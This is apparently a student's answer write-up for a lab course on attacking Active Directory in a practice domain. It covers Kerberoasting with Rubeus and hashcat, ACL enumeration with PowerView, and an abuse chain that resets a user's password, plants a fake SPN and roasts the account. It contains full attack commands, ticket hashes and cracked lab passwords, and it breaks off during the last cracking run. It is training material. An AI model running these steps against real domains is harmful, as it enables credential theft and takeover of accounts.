OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

(...)

$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$4ba7e2030bf694e5150ea9614802e6c6$ee35b683eff8a2e43251bc418e9787c354b76463c2a6579d4865fee8813e9f53e0fe072756e88dd0c24c686182af6f52b427dd7dc2feb00289e3afd5458b05cbc7abf54333101ded8170c88f0653c0c3af292e4dc01f0a1588637451b3399a236d0489dbfab1aa8aad5970d31b81ae75b6970c377111108d2f52f05ecf008d68e0590934745fdcb09e528cfe896f74810dd5e79a3e53603bc59899b14c77a691c1d2c93cf07454c2132cd22b34c2670e449e910281e5cd99294d170a8eb06dbce77ca4fc7f5ff4ca90963baf12d79aa787afca5fa1d9229486e13bf1a862e7ec711f534f6d867ffb09bccc657e867ff2f5a4f66ac7a1b6b8adf3dac6522af67c984e462f9a2abb201b2494a469183c635431dbe4245fbdfff8eedc348d45ca2b9fe4205f9c3fb49b2c9e035ff4066f15e7cc0be3b168eea06b7997990a68ec6c7f98f4fa38950b56ba75ef0fc7dfed13137199b114a49623c9c7a5c01ebf809f9a7aa708f2186c864afd32a5c4e1b0b1e3f48236579751a33a688872e613e5fdff52625acaa5fa35ef7c56158a023244b9ce67076c17e9c3ce6f926d4619718a90b6094fadc0751df2d85c5cdca842285c8b6aaea21a2dc820814c6298ac20ecae02197de7ec048815abe4c44846cd62c2463f2fbc071ded368704190f7139c028a13f71ad0c4f748c1771ee6f36eb6f943d67e32382f33f4aca394cfe1a3ca008b0bef50ffc28b63509f16e8aaff7a2056b3cfe16b86c3cd4e3fdd433d20bf6d87bed3c6f2a569a80759485c412b28a6d808b30073a853db0c8fca4feb337dd7f9fa747caaa1129a9fa80609024111e2810812e8be051cf0fb4aabd0f61eeae28a6da44a0ee333417a8a7c1639df0a27d8a118a0f7a26162c0c998a9c658bfe7bcb7bb21d0e9fb72fc0d01cd2f5f4caeda0c3580420d26b1f3790dfceee05c297656b4befc8a4b74dcc4d420a5f11b72ac6e4f7f71b867e8f151be594f94675e4823e4ebef8d9c9d5ac2e40b9f23b625410d8d04dc9881730ffe84a0f06a9b972f6449438d826ed6c347d56bae8af3328c00864f8afba7a53e1561937f70d83a8f0bd43f92e5ab5ba166290ff6b3f855e0ab8999b9b7b30184705b9a225b1bf2881c385397603888278fbd2cb059db655be3a4e5782340abb5824321aa48cecc2b1a01752a5c4c7d83030bd5fb24b3d194d9286665285a4338e336a1a33af42e731e144a10ed9714fd9d14c8fadfc9a955985fdb560c2386521c66fa8760dcb3f3fcaaf9d7e6bd0cb80c8c19a620229fe685065499013dd2087c0537a504e426a36e5b7dc41d1b3a5a056318f13d9cddf4691273bb29b33dd7aa97f676725cecdacb910db8f94b890adee28ae4341c480a8dbfc90c32c0cd589ac4e7ae13465badced24b0ae24fd033d8fdc6d97b1f077c2:!SapperFi2
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEF...f077c2
Time.Started.....: Wed Mar  1 14:06:43 2023 (9 secs)
Time.Estimated...: Wed Mar  1 14:06:52 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1612.2 kH/s (0.92ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14342144/14344385 (99.98%)
Rejected.........: 0/14342144 (0.00%)
Restore.Point....: 14340096/14344385 (99.97%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: !carolyn -> !;edelritt
Hardware.Mon.#1..: Util: 75%

Started: Wed Mar  1 14:06:28 2023
Stopped: Wed Mar  1 14:06:54 2023
```

User:pass `SAPSservice:!SapperFi2`

**Answer:** `!SapperFi2`

### Question 2:
![](./attachments/Pasted%20image%2020230301200203.png)

Snip of the output in previous section:

```
(...)
SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never> 
(...)
```

**Answer:** `Account Operators`

---
## Kerberoasting - from Windows
### Question 1:
![](./attachments/Pasted%20image%2020230301205523.png)

```
PS C:\Tools> .\Rubeus.exe kerberoast /user:* /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : *
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 12

(...)

[*] SamAccountName         : svc_vmwaresso
[*] DistinguishedName      : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 4/5/2022 12:32:46 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$98F6D7D3884ACA92C7B5854BB87D2295$241E77C3571FCDD5FF7D3803E6C6BEF5ACE94CBDBE0DC098DAD6BB4B943837B89E67BB2B67C771342B34974FD4439F53221ED9172E9FB868353B79AEC92FABFAA59318F56C5F2FBE0913FB3F9C81F30CB15AEACB075ABD2CDF8809B35E6A48D6776B4708C5D0B420FBC56E2B55E6B414F2B423109C8DE78FE15AD42A0600918A9156BA0EF560CE219D311C98B756BEDF946241705E8B2DFCB604181149116319502AFD8905EFAF89DD7A094BC065357B25B8D250C3842C31A09217D1FD027C4A9658911283680E57BC0BAF4F046F72F337C1B9927C3721CDC436748167082C517A2AC884636BE4A8CB6314209CB7717A2F44B4FC2217AA70472EA7B51FFB4AFD50ACED1DE19C5DFB67569FAF7002FFF73FCA73AEF385C9DFDC52875E31B92FB4EC771BE4E1EEAE99AC2E011703A6FCCB725E4B4E5598727733D541BCCC4D88D4438C7F4F02A3EB43A1C72B2BE156520CECE1034F59D67B6640B4B33CDF6A04018479E0BD19381CD5F82B5D5B8C460BC6386D7E0E831961F98C02E87F162C4C88C4801AE72DB9A64B62CAA3FA58408C70EB329BA9D1FF9F324B673733E4CB4563ADF963F56C466CFA3B75933554807DC6A2D60CF9260D6C111BA9B2C816FFF59654A56FBEBD0A01591C1D1485D5481E03728B75AF2A5E688BEEAD01A6F72D1C6567F4FA82B1A16E9B2915A7ED46D141B32B6CA7F6A3DBB8FE793760657EC34B6CC1BCBB481B2CB17B4601C30A22D31594DD799E7356A5BF7118CD87EBD83263BFC75400AAF5AD71D1A1A1BAA5F524D88D6D4F4E9272FA9D8EA35D69B3DB6AA52A4A3E8AF7ED2A4102D3BD1C3162BCC0B2865522F0FE66ADD8014F534EEFFDCE110542C89E5A71A71B8E26E7E363FA0955E876A931F0DB2D791D943CE72201D7D07C2AE4D1C39A71E443876566A6975F560A039FB967511DD74E4431AF595B5E3ACD2F40FF10FBA65B455E62236927D11E694B3ADF3AAEDB32BCBFCA632D41B9769B7CBFE56FD9D224F13E79B60946C569D9927960917DB0CDC75AA81EC8B2A5FAAA065236EC7468DC47E13953402D62AEAFE0935E5512160D69A9CF6C3B3173DF39FE41B2B59BF3F035E6829AD7447E6E1CAFD8424DD0FC7B197CD2AE437F684A70D61FA8DE9C44350FBA89791BD7ABD3E7902BDD91C6212EEF2E6DFF08F927DFE9972C81639712E4F2EC7A93A45C2837586307BF5A0F5F941FBBA5624D5CC2CF733A00B8456FE76F3FF29C3FA30B9DCD73741690B32AE8C8B777D5BC0F6866D47F2D46F21F4EC2B3238082DC7EC393B63F5FCF6777FA32C108C04E9BB3BA329394C94AD360A4721FB00CF91E2C23B4C2EF56EE7EC21CE0405427CE7E3D74FA6FA74BCCE985B66D7E55BDBC917814A4A8136EEBA1E4272FEB791D492C2EC482E8F66BAD638BC0E5F7F153FE3E9EFE36C8750CDDC1635B72D47AF95EF189F9195D41E8C1A20787726CEFDD38549BA5889D49B07BDE4947263888C8B5B0F9F818B6A85370CAF390630D3A907E8F252D9BE0E89D5FD5914E2F81EB7F803A217CA9605E297228843734A260AAB2782836EF40B4244EA9DB1283DB8BCD535CD729C05D657721288ADA3AF6E2C4936DD9485871A4614C076AA72377F70A05E0D0BE92A3EAD1301D29898A66C8F55FD21FCA5FF289BDFD0BDFB9B65ADD
```

**Answer:** `svc_vmwaresso`

### Question 2:
![](./attachments/Pasted%20image%2020230301205534.png)
*Hint: The password should take around 10 seconds to crack on a CPU using rockyou.txt*

Paste the hash obtained in the previous question into a file (`vmware_tgs.hash`) with nano and start cracking it with `hashcat`.

```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 vmware_tgs.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

(...)

$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$98f6d7d3884aca92c7b5854bb87d2295$241e77c3571fcdd5ff7d3803e6c6bef5ace94cbdbe0dc098dad6bb4b943837b89e67bb2b67c771342b34974fd4439f53221ed9172e9fb868353b79aec92fabfaa59318f56c5f2fbe0913fb3f9c81f30cb15aeacb075abd2cdf8809b35e6a48d6776b4708c5d0b420fbc56e2b55e6b414f2b423109c8de78fe15ad42a0600918a9156ba0ef560ce219d311c98b756bedf946241705e8b2dfcb604181149116319502afd8905efaf89dd7a094bc065357b25b8d250c3842c31a09217d1fd027c4a9658911283680e57bc0baf4f046f72f337c1b9927c3721cdc436748167082c517a2ac884636be4a8cb6314209cb7717a2f44b4fc2217aa70472ea7b51ffb4afd50aced1de19c5dfb67569faf7002fff73fca73aef385c9dfdc52875e31b92fb4ec771be4e1eeae99ac2e011703a6fccb725e4b4e5598727733d541bccc4d88d4438c7f4f02a3eb43a1c72b2be156520cece1034f59d67b6640b4b33cdf6a04018479e0bd19381cd5f82b5d5b8c460bc6386d7e0e831961f98c02e87f162c4c88c4801ae72db9a64b62caa3fa58408c70eb329ba9d1ff9f324b673733e4cb4563adf963f56c466cfa3b75933554807dc6a2d60cf9260d6c111ba9b2c816fff59654a56fbebd0a01591c1d1485d5481e03728b75af2a5e688beead01a6f72d1c6567f4fa82b1a16e9b2915a7ed46d141b32b6ca7f6a3dbb8fe793760657ec34b6cc1bcbb481b2cb17b4601c30a22d31594dd799e7356a5bf7118cd87ebd83263bfc75400aaf5ad71d1a1a1baa5f524d88d6d4f4e9272fa9d8ea35d69b3db6aa52a4a3e8af7ed2a4102d3bd1c3162bcc0b2865522f0fe66add8014f534eeffdce110542c89e5a71a71b8e26e7e363fa0955e876a931f0db2d791d943ce72201d7d07c2ae4d1c39a71e443876566a6975f560a039fb967511dd74e4431af595b5e3acd2f40ff10fba65b455e62236927d11e694b3adf3aaedb32bcbfca632d41b9769b7cbfe56fd9d224f13e79b60946c569d9927960917db0cdc75aa81ec8b2a5faaa065236ec7468dc47e13953402d62aeafe0935e5512160d69a9cf6c3b3173df39fe41b2b59bf3f035e6829ad7447e6e1cafd8424dd0fc7b197cd2ae437f684a70d61fa8de9c44350fba89791bd7abd3e7902bdd91c6212eef2e6dff08f927dfe9972c81639712e4f2ec7a93a45c2837586307bf5a0f5f941fbba5624d5cc2cf733a00b8456fe76f3ff29c3fa30b9dcd73741690b32ae8c8b777d5bc0f6866d47f2d46f21f4ec2b3238082dc7ec393b63f5fcf6777fa32c108c04e9bb3ba329394c94ad360a4721fb00cf91e2c23b4c2ef56ee7ec21ce0405427ce7e3d74fa6fa74bcce985b66d7e55bdbc917814a4a8136eeba1e4272feb791d492c2ec482e8f66bad638bc0e5f7f153fe3e9efe36c8750cddc1635b72d47af95ef189f9195d41e8c1a20787726cefdd38549ba5889d49b07bde4947263888c8b5b0f9f818b6a85370caf390630d3a907e8f252d9be0e89d5fd5914e2f81eb7f803a217ca9605e297228843734a260aab2782836ef40b4244ea9db1283db8bcd535cd729c05d657721288ada3af6e2c4936dd9485871a4614c076aa72377f70a05e0d0be92a3ead1301d29898a66c8f55fd21fca5ff289bdfd0bdfb9b65add:Virtual01
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmwa...b65add
Time.Started.....: Wed Mar  1 15:06:48 2023 (6 secs)
Time.Estimated...: Wed Mar  1 15:06:54 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1621.5 kH/s (0.97ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10508288/14344385 (73.26%)
Rejected.........: 0/10508288 (0.00%)
Restore.Point....: 10506240/14344385 (73.24%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: W141414 -> Villegas211090
Hardware.Mon.#1..: Util: 77%

Started: Wed Mar  1 15:06:47 2023
Stopped: Wed Mar  1 15:06:56 2023
```

User:pass `svc_vmwaresso:Virtual01`

**Answer:** `Virtual01`

---
## Access Control List (ACL) Abuse Primer
### Question 1:
![](./attachments/Pasted%20image%2020230302102927.png)

"`Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object."

**Answer:** `DACL`

### Question 2:
![](./attachments/Pasted%20image%2020230302102937.png)

"[GenericAll](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack."

**Answer:** `GenericAll`

---
## ACL Enumeration
### Question 1:
![](./attachments/Pasted%20image%2020230302105719.png)

```
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

Name              : User-Force-Change-Password
DisplayName       : Reset Password
DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
```

**Answer:** `00299570-246d-11d0-a768-00aa006e0529`

### Question 2:
![](./attachments/Pasted%20image%2020230302105730.png)

"PowerView has the `ResolveGUIDs` flag, which does this very thing for us. Notice how the output changes when we include this flag to show the human-readable format of the `ObjectAceType` property as `User-Force-Change-Password`."

**Answer:** `ResolveGUIDs`

### Question 3:
![](./attachments/Pasted%20image%2020230302105742.png)

```
PS C:\htb> $sid2 = Convert-NameToSid damundsen
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

AceType               : AccessAllowed
ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4022
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1176
AccessMask            : 131132
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

**Answer:** `GenericWrite`

### Question 4:
![](./attachments/Pasted%20image%2020230302105755.png)
*Hint: Don't forget to get the SID of the forend user before doing your search!*

```
PS C:\Tools> Convert-NameToSid forend
S-1-5-21-3842939050-3880317879-2865463114-5614

PS C:\Tools> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq "S-1-5-21-3842939050-3880317879-2865463114-5614"}

ObjectDN              : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1152
ActiveDirectoryRights : GenericAll
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983551
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

**Answer:** `GenericAll`

### Question 5:
![](./attachments/Pasted%20image%2020230302105810.png)

Same command as in last question but takes around 40 minutes to show up.

```
PS C:\tools> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq "S-1-5-21-3842939050-3880317879-2865463114-5614"} -Verbose

(...)

AceQualifier           : AccessAllowed
ObjectDN               : CN=GPO Management,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : Self
ObjectAceType          : Self-Membership
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-4046
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-5614
AccessMask             : 8
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

**Answer:** ``

---
##
### Question:
![](./attachments/Pasted%20image%2020230303113913.png)

Load `PowerView` and create a PSCredential Object with `forend` user.

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\tools
PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> $SecPassword = ConvertTo-SecureString 'Klmcargo2' -AsPlainText -Force
PS C:\tools> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\forend', $SecPassword)
```

We will use this to change the password of the `dpayne` user.

```
PS C:\tools> $dpaynePassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\tools> Set-DomainUserPassword -Identity dpayne -AccountPassword $dpaynePassword -Credential $Cred -Verbose
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'dpayne'
VERBOSE: [Set-DomainUserPassword] Password for user 'dpayne' successfully reset
```

Create a new PSCredential Object with user `dpayne`.

```
PS C:\tools> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\tools> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dpayne', $SecPassword)
```

Check if `dpayne` is part of the "Help Desk Level 1" group.

```
PS C:\tools> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

MemberName
----------
(...)
damundsen
dpayne
```

Create a fake SPN for user `adunn`.

```
PS C:\tools> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

Use `Rubeus` to perforn Kerberrosting on user `adunn` to obtain the hash.

```
PS C:\tools> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$4075B7B81811F75A4CAED058A1CCCA1A$1794B315405D07C6AE955C779768A502F44668371017CD98FD81C13DEAD10FD1A46EECF0B282D2BA2F80A8066C59B660F7151FA3C5B89802F23D85CD245FC2A65293C60122CF6A4192F5EEF9BC593EDC8E94D8D129084308F656DA4342A34D61B18F0A097495C165C3DB6D251106BB92E6C60DEB447B2A878B474C1096A0E251ABFAAFF63A07BA050B1382047F9C8093BBF9D8CDA80C649382F9C42F0B0B729D308B548BB2961AE4B26861BD8B9FA0501B8AB052F3937B0AF60A18F932C978EDFAC2E034D67774925AC9E6833DC939D835BF1BEA0ECC4987F23BA911365747D5DD21741236876B2CF513CA4F10F4E756643DC03AE454B2E67EFAC0DC7C02EA2FC95EBF78E4D8919E50AA5D1193B6F3F8B7FC9D7335BC55E7EF0C24D0A6C2B37BB98C63EB4B8F65FEB1748851165593DBB85E1B22E4522F870C884ABF4C3A608478850F16338063736209921F2AAADDD840163D447C19603A2D61328EBD50BF5AF7E779E3AB19F059B8F1900B7BE7EC4AFEECFABBD4574F5F87DA736737CAD91C4922B59BB158EA12F6C61CE0BF93E816EA9A3A1C8AEB5665AE619056FFB8373FD5D37E4071CEB6089FFD4D6217190528E68BEECD1E735F8F4EB0EB7AABF0A672245AFE7C51976B8E580CBEEC7EDBC7401E390E8504DDAD50C6AB489AB6D9BFB1E32584BC5076108CF577F92E6F7A6766D8D16104388D77E27DF14C02A52089B27E06570E3910447C1149472E682C3BA04891B72E7D8A8FB37E9F8CE976CAF14ED8524DD4BD36ADE36702FDB06BB2ED59B35E6B8CDAB58B20EBC5355F42840A0519D9A680DD1D14263588E949E9E85D09FB7DED3FD7FA51F51C4703A2F4CF9867785ADE6C5E7188C38C76E24DEB42CDEE789EA53D06BBB5FDF21F1FF733B34AEFD84AF3B814832FCBFD661153000059E547A7209974B254E099E4348DBABE47F69EAE5D4332C5979C6D72AAD43A39AB041D5D39CF28F0409342B03C9D5294F917F57E704BF5287975539C035C12767B2C1040F115D6BA8E19EBA9E4B6C65DEA8E59287A5BDF166858D9368F679D243698E5A127E911D127009ED3C96BF59869AC23A870DC36E1AE57843E4C548604D9F3D64AEA0F33D63C6FCA6FD2626D346090CD68C68D9D754B5882D393801B3F89AAFA4EF124C34FF9F6513C1FFFC410934864F7D25C4E22C7311CB8339B85C4884E7168526B098585D1B8682E82664E4BA4165F7003ABBCC8E5540612D10BA30158AE004CF55B4937CC0976D2BAD6C054550DED2997F39C6AD5F30A551E168013D185FC33832D413DCF9145BF00CB574969141CCFD8408BB8CA4072F75CAF076D5E5D7E49993D87A739A214E20CF61EBD2A830D5312122F97D9D40A6594A00B63627CD12D4CCC9FD0564FD39D40EA0BA575B47C7289BD503D2900246D7291F41CE5ABD4B1F65FDBA2CB6FBB68AA789B7C54A9EB6B2A645D7DDF22457FEA19221F91FD3258420B1D1165C39C1887476D33AC233A8B9B190206F504D59D7685AABA66761F49D0948EBFD7743C043A7438119460B437F9E598A5F9F1A0AA3FA729347CC9B250791981F0A41AF0B9CC656402F883A2F03118A30A82077334C6E38A1ECE29A551E729A7BC0894D53C79B77CBA3A875D449AD03CE1E15F3EE15C563E4A901AA7191565B00733B0
```

Lastly, crack the hash with `hashcat`.

```
┌──(kali㉿kali)-[~]
└─$ hashcat -m 13100 adunn_tgs.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 9 3900X 12-Core Processor, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

